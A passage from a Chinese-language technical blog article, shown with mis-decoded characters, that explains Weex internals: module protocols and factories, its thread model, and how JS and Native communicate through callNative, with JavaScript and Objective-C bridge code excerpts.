<li>ç»“æœå›è°ƒï¼šå¦‚æœæœ‰éœ€è¦ï¼ŒNative å¯ä»¥é€šè¿‡ WXModuleCallBack æˆ–è€… WXModuleKeepAliveCallBack å°†ç»“æœå›è°ƒç»™ JSã€‚WXModuleCallback åªèƒ½å›è°ƒ1æ¬¡ï¼Œè€Œ WXModuleKeepAliveCallback å¯ä»¥å¤šæ¬¡å›è°ƒ</li>
</ul>
<h3 data-id="heading-34">3. WXModuleProtocol çš„ä½œç”¨</h3>
<p><strong><code>WXModuleProtocol</code> æ˜¯ä¸€ä¸ªåè®®ï¼Œå®šä¹‰äº† Module çš„è¡Œä¸ºè§„èŒƒ</strong>ã€‚ä½ çš„è‡ªå®šä¹‰ Module å¿…é¡»éµå¾ªæ­¤åè®®ã€‚å®ƒå£°æ˜äº† Module éœ€è¦å®ç°çš„æ–¹æ³•æˆ–å±æ€§ï¼Œä¾‹å¦‚å¦‚ä½•æš´éœ²æ–¹æ³•ç»™ JSï¼ˆé€šè¿‡ <code>WX_EXPORT_METHOD</code> å®ï¼‰ã€æ–¹æ³•åœ¨å“ªä¸ªçº¿ç¨‹æ‰§è¡Œï¼ˆé€šè¿‡å®ç°ç‰¹å®šçš„æ–¹æ³•è¿”å›ç›®æ ‡çº¿ç¨‹ï¼Œä¾‹å¦‚ <code>targetExecuteThread</code>ï¼‰ã€ä»¥åŠå¦‚ä½•é€šè¿‡ <code>weexInstance</code> å±æ€§å¼±å¼•ç”¨æŒæœ‰å®ƒçš„ WXSDKInstance å®ä¾‹ã€‚
é€šè¿‡éµå¾ª <code>WXModuleProtocol</code>ï¼Œä½ è‡ªå®šä¹‰çš„ Module å°±èƒ½è¢« Weex SDK æ­£ç¡®è¯†åˆ«å’Œè°ƒ</p>
<h3 data-id="heading-35">4. WXModuleFactory çš„ä½œç”¨</h3>
<ol>
<li><strong>å­˜å‚¨é…ç½®</strong>ï¼šåœ¨æ³¨å†Œé˜¶æ®µï¼Œå®ƒä¼šç¼“å­˜ Module çš„é…ç½®ä¿¡æ¯ï¼Œä¾‹å¦‚æ¨¡å—åå’Œå¯¹åº”çš„å·¥å‚ç±»ï¼ˆ<code>WXModuleConfig</code>ï¼‰ã€‚</li>
<li><strong>æ–¹æ³•è§£æ</strong>ï¼šé€šè¿‡åå°„ï¼Œè§£æ Module ç±»ä¸­æ‰€æœ‰é€šè¿‡ <code>WX_EXPORT_METHOD</code> æˆ– <code>WX_EXPORT_METHOD_SYNC</code> å®æš´éœ²çš„æ–¹æ³•ï¼Œå¹¶ç”Ÿæˆæ–¹æ³•åä¸ <code>MethodInvoker</code>ï¼ˆå°è£…äº†åå°„è°ƒç”¨é€»è¾‘ï¼‰çš„æ˜ å°„å…³ç³»ã€‚</li>
<li>æä¾›å®ä¾‹ï¼šå½“ JS è°ƒç”¨ Module æ–¹æ³•æ—¶ï¼Œ<code>WXModuleManager</code> ä¼šé€šè¿‡ <code>WXModuleFactory</code> æ ¹æ®æ¨¡å—åè·å–æˆ–åˆ›å»º Module å®ä¾‹ï¼Œä»¥åŠå¯¹åº”æ–¹æ³•çš„ <code>MethodInvoker</code>ã€‚</li>
</ol>
<h2 data-id="heading-36">å…«ã€Weex åˆ†ä¸ºå‡ ä¸ªçº¿ç¨‹</h2>
<h3 data-id="heading-37">1. ä¸»çº¿ç¨‹</h3>
<p>æ ¸å¿ƒå®šä½ï¼šåº”ç”¨çš„ UI çº¿ç¨‹ï¼ˆä¸åŸç”Ÿ App ä¸»çº¿ç¨‹åŒæºï¼‰ï¼Œè´Ÿè´£ UI æ¸²æŸ“ã€ç”¨æˆ·äº¤äº’å“åº”ï¼Œ<strong>ç¦æ­¢è€—æ—¶æ“ä½œ</strong>ã€‚</p>
<p>æ ¸å¿ƒèŒè´£ï¼š</p>
<ul>
<li>æ‰¿è½½ Weex é¡µé¢çš„ <strong>åŸç”Ÿæ¸²æŸ“å®¹å™¨</strong>ï¼ˆå¦‚ Android çš„ <code>WXFrameLayout</code>ã€iOS çš„ <code>WXSDKInstanceView</code>ï¼‰ï¼Œæ‰§è¡Œè§†å›¾å¸ƒå±€ã€ç»˜åˆ¶ã€åŠ¨ç”»è§¦å‘ï¼›</li>
<li>å¤„ç†ç”¨æˆ·äº¤äº’äº‹ä»¶ï¼ˆç‚¹å‡»ã€æ»‘åŠ¨ã€è¾“å…¥ç­‰ï¼‰ï¼Œå¹¶å°†äº‹ä»¶è½¬å‘ç»™ JS çº¿ç¨‹ï¼ˆå¦‚éœ€è¦ JS é€»è¾‘å“åº”æ—¶ï¼‰ï¼›</li>
<li>æ‰§è¡ŒåŸç”Ÿæ¨¡å—çš„ <strong>ä¸»çº¿ç¨‹æ–¹æ³•</strong>ï¼ˆé€šè¿‡ <code>@WXModuleAnnotation(runOnUIThread = true)</code> æ ‡è®°çš„æ–¹æ³•ï¼Œå¦‚å¼¹ Toastã€æ›´æ–° UI çš„åŸç”Ÿèƒ½åŠ›ï¼‰ï¼›</li>
<li>æ¥æ”¶ JS çº¿ç¨‹ä¸‹å‘çš„ <strong>UI æ“ä½œæŒ‡ä»¤</strong>ï¼ˆå¦‚åˆ›å»ºè§†å›¾ã€ä¿®æ”¹æ ·å¼ã€æ›´æ–°å±æ€§ï¼‰ï¼Œå¹¶æ˜ å°„ä¸ºåŸç”Ÿè§†å›¾æ“ä½œï¼›</li>
</ul>
<p><strong>å…³é”®çº¦æŸ</strong>ï¼šæ‰€æœ‰ç›´æ¥æ“ä½œåŸç”Ÿè§†å›¾çš„é€»è¾‘å¿…é¡»åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œï¼Œå¦åˆ™ä¼šå¯¼è‡´ UI é”™ä¹±æˆ–å´©æºƒ</p>
<h3 data-id="heading-38">2. JS çº¿ç¨‹</h3>
<p>æ ¸å¿ƒå®šä½ï¼šWeex çš„ â€œä¸šåŠ¡é€»è¾‘çº¿ç¨‹â€ï¼Œç‹¬ç«‹äºä¸»çº¿ç¨‹ï¼Œä¸“é—¨è¿è¡Œ JavaScript ä»£ç ï¼Œé¿å…é˜»å¡ UIã€‚</p>
<p>æ ¸å¿ƒèŒè´£ï¼š</p>
<ul>
<li>åŠ è½½å¹¶æ‰§è¡Œ Weex ä¸šåŠ¡ä»£ç ï¼ˆ<code>.we</code> ç¼–è¯‘åçš„ JS bundleï¼‰ï¼ŒåŒ…æ‹¬ Vue/React ç»„ä»¶åˆå§‹åŒ–ã€æ•°æ®ç»‘å®šã€ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼›</li>
<li>å¤„ç† JS å±‚é¢çš„ä¸šåŠ¡é€»è¾‘ï¼ˆäº‹ä»¶å“åº”ã€æ•°æ®è®¡ç®—ã€æ¥å£è¯·æ±‚é¢„å¤„ç†ï¼‰ï¼›</li>
<li>è°ƒç”¨åŸç”Ÿæ¨¡å—æ—¶ï¼Œé€šè¿‡ <strong>JSBridge è½¬å‘è¯·æ±‚</strong>ï¼ˆåŒºåˆ†åŒæ­¥ / å¼‚æ­¥ï¼ŒåŒæ­¥è¯·æ±‚ä¼šçŸ­æš‚é˜»å¡ JS çº¿ç¨‹ï¼Œéœ€è°¨æ…ä½¿ç”¨ï¼‰ï¼›</li>
<li>ç”Ÿæˆ UI æ“ä½œæŒ‡ä»¤ï¼ˆå¦‚ <code>createElement</code>ã€<code>updateStyle</code>ï¼‰ï¼Œé€šè¿‡è·¨çº¿ç¨‹é€šä¿¡å‘é€ç»™ä¸»çº¿ç¨‹æ‰§è¡Œï¼›</li>
<li>æ¥æ”¶ä¸»çº¿ç¨‹è½¬å‘çš„ç”¨æˆ·äº¤äº’äº‹ä»¶ï¼ˆå¦‚ç‚¹å‡»å›è°ƒï¼‰ï¼Œæ‰§è¡Œå¯¹åº”çš„ JS äº‹ä»¶å¤„ç†å‡½æ•°ï¼›</li>
</ul>
<p>å…³é”®ä¼˜åŒ–**ï¼šæœ€æ–°ç‰ˆæœ¬ä¸­ï¼ŒJS çº¿ç¨‹æ”¯æŒ <strong>Bundle é¢„åŠ è½½</strong>ã€<strong>æ‡’åŠ è½½ç»„ä»¶</strong>ï¼Œå‡å°‘å¯åŠ¨è€—æ—¶ï¼›åŒæ—¶é€šè¿‡ <code>JSContext</code>éš”ç¦»å¤šä¸ª Weex å®ä¾‹ï¼Œé¿å…çº¿ç¨‹å†…èµ„æºç«äº‰ã€‚</p>
<h3 data-id="heading-39">3. è€—æ—¶çº¿ç¨‹</h3>
<h4 data-id="heading-40">1. ç½‘ç»œçº¿ç¨‹</h4>
<p>æ ¸å¿ƒå®šä½ï¼šWeex æ¡†æ¶å°è£…çš„ <strong>ä¸“ç”¨ç½‘ç»œçº¿ç¨‹</strong>ï¼ˆè·¨ç«¯ç»Ÿä¸€è°ƒåº¦ï¼‰ï¼Œé¿å…ç½‘ç»œè¯·æ±‚é˜»å¡ä¸»çº¿ç¨‹æˆ– JS çº¿ç¨‹ã€‚</p>
<p>æ ¸å¿ƒèŒè´£ï¼š</p>
<ul>
<li>å¤„ç† Weex å†…ç½®çš„ç½‘ç»œè¯·æ±‚ï¼ˆå¦‚ <code>weex.requireModule('stream')</code> å‘èµ·çš„ HTTP/HTTPS è¯·æ±‚ï¼‰ï¼›</li>
<li>è´Ÿè´£ JS Bundle çš„ä¸‹è½½ï¼ˆé¦–æ¬¡åŠ è½½æˆ–æ›´æ–°æ—¶ï¼‰ï¼Œæ”¯æŒæ–­ç‚¹ç»­ä¼ ã€ç¼“å­˜ç®¡ç†ï¼›</li>
<li>å¤„ç†ç½‘ç»œè¯·æ±‚çš„æ‹¦æˆªã€é‡è¯•ã€è¶…æ—¶æ§åˆ¶ï¼ˆæ¡†æ¶å±‚ç»Ÿä¸€å®ç°ï¼Œæ— éœ€ä¸šåŠ¡å…³å¿ƒï¼‰ï¼›</li>
<li>å°†ç½‘ç»œå“åº”ç»“æœé€šè¿‡ JSBridge å›ä¼ ç»™ JS çº¿ç¨‹ï¼›</li>
</ul>
<p>è®¾è®¡äº®ç‚¹ï¼šä¸åŸç”Ÿç³»ç»Ÿçš„ç½‘ç»œåº“è§£è€¦ï¼Œä½†å¯¹å¤–æš´éœ²ç»Ÿä¸€çš„ JS APIï¼Œçº¿ç¨‹è°ƒåº¦ç”±æ¡†æ¶å†…éƒ¨ç®¡ç†ï¼Œä¸šåŠ¡æ— éœ€æ‰‹åŠ¨åˆ‡æ¢çº¿ç¨‹</p>
<h4 data-id="heading-41">2. å›¾ç‰‡ä¸‹è½½çº¿ç¨‹</h4>
<p>æ ¸å¿ƒå®šä½ï¼šä¸“é—¨å¤„ç† Weex å›¾ç‰‡çš„å¼‚æ­¥åŠ è½½ã€è§£ç ï¼Œé¿å…å ç”¨ä¸»çº¿ç¨‹èµ„æºå¯¼è‡´ UI å¡é¡¿ã€‚</p>
<p>æ ¸å¿ƒèŒè´£ï¼š</p>
<ul>
<li>åŠ è½½ç½‘ç»œå›¾ç‰‡ã€æœ¬åœ°å›¾ç‰‡ï¼ˆé€šè¿‡ <code>img</code> æ ‡ç­¾æˆ– <code>weex.requireModule('image')</code>ï¼‰ï¼›</li>
<li>å›¾ç‰‡è§£ç ã€å‹ç¼©ï¼ˆé€‚é…è§†å›¾å°ºå¯¸ï¼Œå‡å°‘å†…å­˜å ç”¨ï¼‰ï¼›</li>
<li>å›¾ç‰‡ç¼“å­˜ç®¡ç†ï¼ˆå†…å­˜ç¼“å­˜ + ç£ç›˜ç¼“å­˜ï¼Œæ¡†æ¶å±‚ç»Ÿä¸€ç»´æŠ¤ï¼‰ï¼›</li>
<li>åŠ è½½å®Œæˆåï¼Œå°†å›¾ç‰‡ bitmap æäº¤åˆ°ä¸»çº¿ç¨‹æ¸²æŸ“ï¼›</li>
</ul>
<p>iOS ä¾§å›¾ç‰‡åŠ è½½çº¿ç¨‹çš„æ ¸å¿ƒç®¡ç†ç±»æ˜¯ <code>WXImageComponent</code>ã€‚</p>
<p>Weex çº¿ç¨‹èŒè´£è¾¹ç•Œæ¸…æ™°ï¼š<strong>UI æ“ä½œå½’ä¸»çº¿ç¨‹ï¼ŒJS é€»è¾‘å½’ JS çº¿ç¨‹ï¼Œè€—æ—¶æ“ä½œå½’å·¥ä½œçº¿ç¨‹ / ç½‘ç»œçº¿ç¨‹</strong>ï¼Œé¿å…è·¨çº¿ç¨‹ç›´æ¥æ“ä½œèµ„æº</p>
<h2 data-id="heading-42">ä¹ã€JS å’Œ Native é€šä¿¡</h2>
<h3 data-id="heading-43">1. callJS å’Œ callNative</h3>


























<table><thead><tr><th>é€šä¿¡æ–¹å‘</th><th>å‘èµ·æ–¹</th><th>æ¥æ”¶æ–¹</th><th>æ ¸å¿ƒç›®çš„</th><th>å…¸å‹åœºæ™¯</th></tr></thead><tbody><tr><td><code>callNative</code></td><td>JS</td><td>Native</td><td>JS è°ƒç”¨ Native çš„æ¨¡å— / ç»„ä»¶æ¥å£</td><td>æ¸²æŸ“ç»„ä»¶ã€å¼¹ Toastã€è·å–è®¾å¤‡ä¿¡æ¯</td></tr><tr><td><code>callJS</code></td><td>Native</td><td>JS</td><td>Native è§¦å‘ JS çš„å›è°ƒå‡½æ•°</td><td>ç»„ä»¶äº‹ä»¶å›è°ƒï¼ˆå¦‚æŒ‰é’®ç‚¹å‡»ï¼‰ã€æ•°æ®åŒæ­¥ï¼ˆå¦‚ç½‘ç»œè¯·æ±‚ç»“æœï¼‰</td></tr></tbody></table>
<p>ä¸¤è€…çš„åº•å±‚ä¾èµ– <strong>åŒä¸€ä¸ª JS Bridge é€šé“</strong>ï¼Œåªæ˜¯ã€Œå‘èµ·æ–¹ã€å’Œã€Œæ•°æ®æ ¼å¼ã€ä¸åŒï¼ŒWeex å·²å°è£…å¥½ç»Ÿä¸€çš„é€šä¿¡æ¡†æ¶ï¼Œå¼€å‘è€…æ— éœ€å…³å¿ƒåº•å±‚ä¼ è¾“ç»†èŠ‚</p>
<h3 data-id="heading-44">2. callNative å®ç°</h3>
<p><code>callNative</code> æ˜¯ JS ä¸»åŠ¨è°ƒç”¨ Native æ¥å£çš„è¿‡ç¨‹ï¼Œæ ¸å¿ƒæµç¨‹ï¼š<strong>JS æ„é€ æ ‡å‡†åŒ–æŒ‡ä»¤ â†’ åºåˆ—åŒ– JSON â†’ æ¡¥æ¥é€šé“å‘é€ â†’ Native è§£ææŒ‡ä»¤ â†’ æ‰§è¡Œå¯¹åº”æ¥å£ â†’ å“åº”ç»“æœå›ä¼ </strong>ã€‚</p>
<p>æ€ä¹ˆæ ·ï¼Ÿæ˜¯ä¸æ˜¯æ„Ÿè§‰ä¼¼æ›¾ç›¸è¯†ï¼Œæ—©æœŸåš Hybrid çš„æ—¶å€™ï¼ŒJS å’Œ Native çš„é€šä¿¡ä¹Ÿæ˜¯ä¸€æ ·çš„æµç¨‹ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥æŸ¥çœ‹<a href="https://link.juejin.cn?target=.%2F1.44.md" target="_blank" title="./1.44.md" ref="nofollow noopener noreferrer">è¿™ç¯‡æ–‡ç« </a>ã€‚</p>
<p>æ˜¯çš„ï¼Œé€šä¿¡è¦è§£å†³çš„é—®é¢˜ä¸€ç›´ä¸å˜ï¼Œæ‰€ä»¥æ–¹æ¡ˆä¹Ÿä¸å˜ã€‚</p>
<h4 data-id="heading-45">1. æ ‡å‡†åŒ–æŒ‡ä»¤æ ¼å¼</h4>
<p>ä¸ºäº†è®© Native èƒ½ç»Ÿä¸€è§£æï¼ŒWeex è§„å®š <code>callNative</code> çš„æŒ‡ä»¤å¿…é¡»åŒ…å« 4 ä¸ªæ ¸å¿ƒå­—æ®µï¼ˆJS ç«¯æ„é€ ï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json">const callNativeæŒ‡ä»¤ = <span class="hljs-punctuation">{</span>
  module<span class="hljs-punctuation">:</span> <span class="hljs-string">"component"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// æ¨¡å—åï¼ˆå¦‚ component/modal/deviceï¼‰</span>
  method<span class="hljs-punctuation">:</span> <span class="hljs-string">"create"</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// æ–¹æ³•åï¼ˆå¦‚ create/toast/getInfoï¼‰</span>
  params<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>             <span class="hljs-comment">// å…¥å‚ï¼ˆå¦‚ç»„ä»¶æ ·å¼ã€Toast å†…å®¹ï¼‰</span>
  callbackId<span class="hljs-punctuation">:</span> <span class="hljs-string">"cb_123"</span>    <span class="hljs-comment">// å›è°ƒ IDï¼ˆç”¨äº Native å›ä¼ ç»“æœï¼‰</span>
<span class="hljs-punctuation">}</span>;
</code></pre>
<ul>
<li><code>module</code> + <code>method</code>ï¼šå®šä½ Native ç«¯çš„å…·ä½“æ¥å£ï¼ˆå¦‚ <code>modal.toast</code> å¯¹åº” Native çš„ã€Œå¼¹ Toastã€æ¥å£ï¼‰ï¼›</li>
<li><code>params</code>ï¼šJS ä¼ é€’ç»™ Native çš„æ•°æ®ï¼ˆéœ€æ˜¯ JSON å…¼å®¹ç±»å‹ï¼‰ï¼›</li>
<li><code>callbackId</code>ï¼šå”¯ä¸€æ ‡è¯†å½“å‰è¯·æ±‚ï¼ŒNative æ‰§è¡Œå®Œæˆåé€šè¿‡è¯¥ ID æ‰¾åˆ°å¯¹åº”çš„ JS å›è°ƒå‡½æ•°ã€‚</li>
</ul>
<h4 data-id="heading-46">2. JS ç«¯å®ç°</h4>
<p>JS ä¾§è°ƒç”¨ Native çš„æ ¸å¿ƒæ˜¯3ä¸ªå®ä¾‹æ–¹æ³•ï¼Œå¯¹åº”3ç±»åœºæ™¯</p>

























<table><thead><tr><th>æ–¹æ³•å</th><th>ç”¨é€”</th><th>å¯¹åº” Native æ¥å£</th></tr></thead><tbody><tr><td><code>callModule</code></td><td>è°ƒç”¨ Native æ™®é€šæ¨¡å—ï¼ˆå¦‚ <code>modal</code>/<code>storage</code>ï¼‰</td><td><code>global.callNativeModule</code></td></tr><tr><td><code>callComponent</code></td><td>è°ƒç”¨ Native è‡ªå®šä¹‰ç»„ä»¶æ–¹æ³•</td><td><code>global.callNativeComponent</code></td></tr><tr><td><code>callDOM</code></td><td>è°ƒç”¨ DOM ç›¸å…³ Native æ–¹æ³•ï¼ˆå¦‚åˆ›å»ºå…ƒç´ ï¼‰</td><td><code>global.callAddElement</code> ç­‰ç‹¬ç«‹æ–¹æ³•</td></tr></tbody></table>
<p>è¿™3ä¸ªæ–¹æ³•éƒ½ä¼šé€šè¿‡ Native æ³¨å…¥çš„å…¨å±€å‡½æ•°ï¼ˆglobal ä¸Šçš„æ–¹æ³•ï¼‰å°†è°ƒç”¨ä¼ é€’ç»™ Native å±‚</p>
<p>è¿™3ä¸ªæ–¹æ³•åœ¨æºç æœ€å</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è°ƒç”¨ DOM ç›¸å…³ Native æ–¹æ³•</span>
callDOM (action, args) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[action](<span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceId</span>, args)
}

<span class="hljs-comment">// è°ƒç”¨ Native è‡ªå®šä¹‰ç»„ä»¶æ–¹æ³•</span>
callComponent (ref, method, args, options) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">componentHandler</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceId</span>, ref, method, args, options)
}

<span class="hljs-comment">// è°ƒç”¨ Native æ™®é€šæ¨¡å—æ–¹æ³•ï¼ˆæœ€å¸¸ç”¨ï¼Œå¯¹åº”åŸ callNativeï¼‰</span>
callModule (<span class="hljs-variable language_">module</span>, method, args, options) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">moduleHandler</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceId</span>, <span class="hljs-variable language_">module</span>, method, args, options)
}
</code></pre>
<h5 data-id="heading-47">1. æ™®é€šæ¨¡å—è°ƒç”¨ callModule â†’ moduleHandler</h5>
<p><code>moduleHandler</code> æ˜¯æ™®é€šæ¨¡å—è°ƒç”¨çš„æœ€ç»ˆè½¬å‘å‡½æ•°ï¼Œæºç ä¸­é€šè¿‡ <code>global.callNativeModule</code> å¯¹æ¥ Nativeï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">proto.<span class="hljs-property">moduleHandler</span> = <span class="hljs-variable language_">global</span>.<span class="hljs-property">callNativeModule</span> ||
    (<span class="hljs-function">(<span class="hljs-params">id, <span class="hljs-variable language_">module</span>, method, args</span>) =&gt;</span>
      <span class="hljs-title function_">fallback</span>(id, [{ <span class="hljs-variable language_">module</span>, method, args }]))
</code></pre>
<ul>
<li>æ­£å¸¸æƒ…å†µï¼ˆå®¢æˆ·ç«¯ç¯å¢ƒï¼‰ï¼š<code>global.callNativeModule</code> æ˜¯ <strong>Native æ³¨å…¥åˆ° JS å…¨å±€çš„å‡½æ•°</strong>ï¼ˆiOS/Android åŸç”Ÿå®ç°ï¼‰ï¼Œç›´æ¥æ¥æ”¶ <code>instanceId</code>ã€æ¨¡å—åã€æ–¹æ³•åã€å‚æ•°ï¼Œä¼ é€’ç»™ Native å±‚ã€‚</li>
<li>é™çº§æƒ…å†µï¼ˆæ—  Native æ¡¥æ¥ï¼‰ï¼šè°ƒç”¨ <code>fallback</code> å‡½æ•°ï¼ˆåˆå§‹åŒ–æ—¶ç”± <code>sendTasks</code> å‚æ•°ä¼ å…¥ï¼Œé€šå¸¸ç”¨äºè°ƒè¯• / æ¨¡æ‹Ÿï¼‰ã€‚</li>
</ul>
<h5 data-id="heading-48">2. è‡ªå®šä¹‰ç»„ä»¶è°ƒç”¨ callComponent â†’ componentHandler</h5>
<p>é€»è¾‘ä¸ <code>moduleHandler</code> ä¸€è‡´ï¼Œå¯¹æ¥ <code>global.callNativeComponent</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">proto.<span class="hljs-property">componentHandler</span> = <span class="hljs-variable language_">global</span>.<span class="hljs-property">callNativeComponent</span> ||
  (<span class="hljs-function">(<span class="hljs-params">id, ref, method, args, options</span>) =&gt;</span>
    <span class="hljs-title function_">fallback</span>(id, [{ <span class="hljs-attr">component</span>: options.<span class="hljs-property">component</span>, ref, method, args }]))
</code></pre>
<h5 data-id="heading-49">3. DOM æ–¹æ³•è°ƒç”¨ callDOM â†’ ç‹¬ç«‹å…¨å±€å‡½æ•°æ˜ å°„</h5>
<p>DOM ç›¸å…³çš„ Native æ–¹æ³•ï¼ˆå¦‚ <code>addElement</code>/<code>updateStyle</code>ï¼‰è¢«å•ç‹¬æ˜ å°„åˆ° <code>global</code> ä¸Šçš„ç‹¬ç«‹å‡½æ•°ï¼ˆè€Œéç»Ÿä¸€çš„ <code>callNative</code>ï¼‰ï¼Œæºç é€šè¿‡ <code>init</code> å‡½æ•°åˆå§‹åŒ–æ˜ å°„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æºç ç¬¬ 116-138 è¡Œï¼šDOM æ–¹æ³•ä¸ Native å…¨å±€å‡½æ•°çš„æ˜ å°„</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span> () {
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DOM_METHODS</span> = {
    <span class="hljs-attr">createFinish</span>: <span class="hljs-variable language_">global</span>.<span class="hljs-property">callCreateFinish</span>,
    <span class="hljs-attr">addElement</span>: <span class="hljs-variable language_">global</span>.<span class="hljs-property">callAddElement</span>, <span class="hljs-comment">// DOM åˆ›å»ºå…ƒç´  â†’ Native çš„ callAddElement</span>
    <span class="hljs-attr">removeElement</span>: <span class="hljs-variable language_">global</span>.<span class="hljs-property">callRemoveElement</span>, <span class="hljs-comment">// DOM åˆ é™¤å…ƒç´  â†’ Native çš„ callRemoveElement</span>
    <span class="hljs-attr">updateAttrs</span>: <span class="hljs-variable language_">global</span>.<span class="hljs-property">callUpdateAttrs</span>, <span class="hljs-comment">// æ›´æ–°å±æ€§ â†’ Native çš„ callUpdateAttrs</span>
    <span class="hljs-comment">// ... å…¶ä»– DOM æ–¹æ³•</span>
  }
  <span class="hljs-keyword">const</span> proto = <span class="hljs-title class_">TaskCenter</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>

  <span class="hljs-comment">// ç»™ TaskCenter åŸå‹æŒ‚è½½ DOM æ–¹æ³•ï¼Œç›´æ¥è°ƒç”¨ Native æ³¨å…¥çš„å…¨å±€å‡½æ•°</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> name <span class="hljs-keyword">in</span> <span class="hljs-variable constant_">DOM_METHODS</span>) {
    <span class="hljs-keyword">const</span> method = <span class="hljs-variable constant_">DOM_METHODS</span>[name]
    proto[name] = method ?
      <span class="hljs-function">(<span class="hljs-params">id, args</span>) =&gt;</span> <span class="hljs-title function_">method</span>(id, ...args) : <span class="hljs-comment">// æ­£å¸¸æƒ…å†µï¼šè°ƒç”¨ Native å…¨å±€å‡½æ•°</span>
      <span class="hljs-function">(<span class="hljs-params">id, args</span>) =&gt;</span> <span class="hljs-title function_">fallback</span>(...) <span class="hljs-comment">// é™çº§æƒ…å†µ</span>
  }
}
</code></pre>
<p>ä¾‹å¦‚è°ƒç”¨ <code>callDOM('addElement', args)</code> æ—¶ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œ <code>global.callAddElement(instanceId, ...args)</code>ï¼Œç›´æ¥å¯¹æ¥ Native çš„ DOM æ¨¡å—ã€‚å…¶å®æ˜¯æ³¨å…¥åˆ° JSContext é‡Œçš„æ–¹æ³•å¯¹è±¡ã€‚</p>
<p>åœ¨ Weex çš„ JS è¿è¡Œç¯å¢ƒä¸­ï¼Œ<code>global</code> æ˜¯ <strong>JS å…¨å±€å¯¹è±¡ï¼ˆGlobal Objectï¼‰</strong>â€”â€” å®ƒæ˜¯æ‰€æœ‰ JS ä»£ç çš„ â€œé¡¶å±‚å®¹å™¨â€ï¼Œæ‰€æœ‰æœªè¢«å®šä¹‰åœ¨å±€éƒ¨ä½œç”¨åŸŸçš„å˜é‡ã€å‡½æ•°ï¼Œæœ€ç»ˆéƒ½ä¼šæŒ‚è½½åˆ° <code>global</code> ä¸Šï¼ˆç±»ä¼¼æµè§ˆå™¨ç¯å¢ƒçš„ <code>window</code>ï¼ŒNode.js ç¯å¢ƒçš„ <code>global</code>ï¼‰</p>
<p><strong>Native å‘ JS å¼•æ“çš„ â€œå…¨å±€ä¸Šä¸‹æ–‡â€ æ³¨å…¥ <code>callAddElement</code> å‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°ä¼šè‡ªåŠ¨æˆä¸º <code>global</code> å¯¹è±¡çš„å±æ€§</strong>â€”â€”JS ä¾§çš„ <code>global.callAddElement</code>ï¼Œæœ¬è´¨å°±æ˜¯è®¿é—®è¿™ä¸ªè¢« Native æ³¨å…¥åˆ°å…¨å±€çš„å‡½æ•°ã€‚</p>
<p>QAï¼šglobal æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>æ˜¯ JS å…¨å±€å¯¹è±¡ã€‚ä¸ç®¡æ˜¯æµè§ˆå™¨ã€Node.js è¿˜æ˜¯ Weex çš„ JS å¼•æ“ï¼ˆJavaScriptCore/QuickJSï¼‰ï¼Œéƒ½æœ‰ä¸€ä¸ª <strong>å…¨å±€å¯¹è±¡ï¼ˆGlobal Objectï¼‰</strong>ï¼š</p>
<ul>
<li>å®ƒæ˜¯ JS è¿è¡Œç¯å¢ƒçš„ â€œæ ¹â€ï¼Œæ‰€æœ‰å…¨å±€å˜é‡ã€å‡½æ•°éƒ½æ˜¯å®ƒçš„å±æ€§ï¼›</li>
<li>ä¸åŒç¯å¢ƒçš„å…¨å±€å¯¹è±¡åç§°ä¸åŒï¼š
<ul>
<li>æµè§ˆå™¨ç¯å¢ƒï¼šå« <code>window</code>ï¼ˆæ¯”å¦‚ <code>window.alert</code>ã€<code>window.document</code>ï¼‰ï¼›</li>
<li>Node.js ç¯å¢ƒï¼šå« <code>global</code>ï¼ˆæ¯”å¦‚ <code>global.console</code>ã€<code>global.setTimeout</code>ï¼‰ï¼›</li>
<li>Weex ç¯å¢ƒï¼šå« <code>global</code>ï¼ˆå› ä¸º Weex ä¸ä¾èµ–æµè§ˆå™¨ï¼Œæ²¡æœ‰ <code>window</code>ï¼Œç›´æ¥ç”¨ JS å¼•æ“åŸç”Ÿçš„å…¨å±€å¯¹è±¡ <code>global</code>ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-objective-c" lang="objective-c">// WXJSCoreBridge.mm
- (void)registerCallAddElement:(WXJSCallAddElement)callAddElement
{
    id callAddElementBlock = ^(JSValue *instanceId, JSValue *ref, JSValue *element, JSValue *index, JSValue *ifCallback) {
        NSString *instanceIdString = [instanceId toString];
        WXSDKInstance *instance = [WXSDKManager instanceForID:instanceIdString];
        if (instance.unicornRender) {
            JSValueRef args[] = {instanceId.JSValueRef, ref.JSValueRef, element.JSValueRef, index.JSValueRef};
            [WXCoreBridge callUnicornRenderAction:instanceIdString
                                           module:"dom"
                                           method:"addElement"
                                          context:[JSContext currentContext]
                                             args:args
                                         argCount:4];
            return [JSValue valueWithInt32:0 inContext:[JSContext currentContext]];
        }

        NSDictionary *componentData = [element toDictionary];
        NSString *parentRef = [ref toString];
        NSInteger insertIndex = [[index toNumber] integerValue];
        if (WXAnalyzerCenter.isInteractionLogOpen) {
            WXLogDebug(@"wxInteractionAnalyzer : [jsengin][addElementStart],%@,%@",instanceIdString,componentData[@"ref"]);
        }
